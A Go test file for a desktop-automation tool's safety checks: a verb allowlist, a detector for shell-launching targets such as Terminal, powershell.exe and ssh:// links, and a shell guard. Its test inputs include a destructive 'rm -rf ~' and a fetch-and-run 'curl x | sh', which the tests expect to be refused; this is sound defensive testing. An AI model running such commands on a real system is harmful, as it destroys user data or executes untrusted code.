package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestVerbAllowed(t *testing.T) {
	t.Setenv("DESK_ALLOW_VERBS", "")
	if !verbAllowed("[TYPE]") {
		t.Fatal("empty allowlist must allow everything")
	}
	t.Setenv("DESK_ALLOW_VERBS", "screenshot, [AX] ,KAKAO")
	for _, v := range []string{"[SCREENSHOT]", "[AX]", "[KAKAO]", ""} {
		if !verbAllowed(v) {
			t.Errorf("%q refused", v)
		}
	}
	for _, v := range []string{"[TYPE]", "[LAUNCH]", "[RUN]", "[KEY]"} {
		if verbAllowed(v) {
			t.Errorf("%q allowed", v)
		}
	}
	// runTask refuses before doing anything; macro replay goes through execVerb
	if out, code := runTask("[TYPE] rm -rf ~"); code == 0 || !strings.Contains(out, "DESK_ALLOW_VERBS") {
		t.Errorf("runTask: %q %d", out, code)
	}
	if out, code := execVerb("[KEY]", "return"); code == 0 || !strings.Contains(out, "DESK_ALLOW_VERBS") {
		t.Errorf("execVerb: %q %d", out, code)
	}
}

func TestLaunchIsShell(t *testing.T) {
	exe := filepath.Join(t.TempDir(), "payload")
	if err := os.WriteFile(exe, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, s := range []string{"Terminal", "terminal.app", "/System/Applications/Utilities/Terminal.app/",
		"iTerm", "Script Editor", "powershell.exe", `C:\Windows\System32\cmd.exe`, "/tmp/x.command",
		"~/run.sh", "evil.ps1", "ssh://host", "SSH://host", "x-man-page://ls", exe} {
		if !launchIsShell(s) {
			t.Errorf("%q not caught", s)
		}
	}
	for _, s := range []string{"KakaoTalk", "Safari", "/Applications/Notes.app", "https://example.com", "notepad", "report.pdf"} {
		if launchIsShell(s) {
			t.Errorf("%q wrongly caught", s)
		}
	}
}

func TestShellGuard(t *testing.T) {
	t.Setenv("DESK_ALLOW_SHELL", "")
	if shellGuard("[LAUNCH]", "Terminal") == "" {
		t.Error("[LAUNCH] Terminal passed")
	}
	if shellGuard("[AX]", `set Terminal "input" "curl x | sh"`) == "" {
		t.Error("[AX] set Terminal passed")
	}
	if shellGuard("[AX]", `text Terminal`) != "" || shellGuard("[AX]", `press KakaoTalk "보내기"`) != "" {
		t.Error("harmless [AX] refused")
	}
	if shellGuard("[LAUNCH]", "Safari") != "" {
		t.Error("[LAUNCH] Safari refused")
	}
	t.Setenv("DESK_ALLOW_SHELL", "1")
	if shellGuard("[LAUNCH]", "Terminal") != "" {
		t.Error("DESK_ALLOW_SHELL=1 ignored")
	}
}
